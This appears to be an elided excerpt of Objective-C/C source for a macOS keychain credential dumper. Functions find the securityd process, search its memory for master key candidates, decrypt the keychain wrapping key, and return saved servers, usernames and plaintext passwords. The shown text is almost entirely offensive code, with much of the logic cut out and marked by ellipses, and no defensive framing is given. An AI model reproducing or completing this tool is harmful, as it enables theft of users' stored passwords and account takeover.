...
int get_securityd_pid() {
    ...
    int proc_count = (int)sz / sizeof(struct kinfo_proc);
    int i, pid = 0;
...
int dump_wrapping_key(char *out, char *master, char *buffer, size_t sz) {
    ...
    for (offset = (int)sz-4; offset >= 0; offset -= 4) {
...
NSMutableArray *print_credentials() {
    NSMutableArray *nsarr_creds = [[NSMutableArray alloc] init];
    if (!g_credentials) return nil;
    int i;
    for (i = 0; i < g_credentials_count; ++i) {
        t_credentials *cred = &g_credentials[i];
        if (!cred->account && !cred->server) continue;
        if (!strcmp(cred->account, "Passwords not saved")) continue;
        NSMutableString *nsstr_server = [[NSMutableString alloc] init];
        NSMutableString *nsstr_username = [[NSMutableString alloc] init];
        NSMutableString *nsstr_password = [[NSMutableString alloc] init];
        if (cred->server != NULL) {
            nsstr_server = [NSMutableString stringWithCString:cred->server encoding:NSUTF8StringEncoding];
        }
        else {
            nsstr_server = [NSMutableString stringWithString:@"[Not saved!]"];
        }
        if (cred->account != NULL) {
            nsstr_username = [NSMutableString stringWithCString:cred->account encoding:NSUTF8StringEncoding];
        }
        else {
            nsstr_username = [NSMutableString stringWithString:@"[Not saved!]"];
        }
        if (cred->password != NULL) {
            nsstr_password = [NSMutableString stringWithCString:cred->password encoding:NSUTF8StringEncoding];
        }
        else {
            nsstr_password = [NSMutableString stringWithString:@"[Not saved!]"];
        }
        
        [nsarr_creds addObject:@{
                                 @"server":nsstr_server,
                                 @"username":nsstr_username,
                                 @"password":nsstr_password,
                                 }];
    }
    return nsarr_creds;
}

int getcreds(int argc, char **argv) {
...
//    printf("[*] Found %i master key candidates\n", g_master_candidates_count);
    ...
    // Phase 2. Try decrypting the wrapping key with each master key candidate
    // to see which one gives a valid result.
    const char *filename = [keychainFile cStringUsingEncoding:NSUTF8StringEncoding];
...
//    printf("[+] Found wrapping key: %s\n", s_key);
    ...
    dump_keychain(key, buffer);
    decrypt_credentials();
    NSArray *ret = [NSArray arrayWithArray:print_credentials()];
